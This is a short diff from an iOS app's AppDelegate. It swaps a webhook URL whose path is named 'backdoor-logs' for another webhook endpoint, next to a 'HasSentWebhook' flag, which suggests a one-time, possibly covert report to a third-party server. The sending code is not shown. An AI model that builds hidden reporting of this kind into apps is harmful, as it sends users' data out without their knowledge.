@@ -28,7 +28,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControlle
     private var isInBackground = false
     var isShowingStartupPopup = false
 
-    private let webhookURL = "https://webhookbeam.com/webhook/7tmrv78pwn/backdoor-logs"
+    private let webhookURL = "https://webhook-data-viewer.onrender.com/api/webhook"
     private let hasSentWebhookKey = "HasSentWebhook"
     
     // Add a dedicated queue for background operations
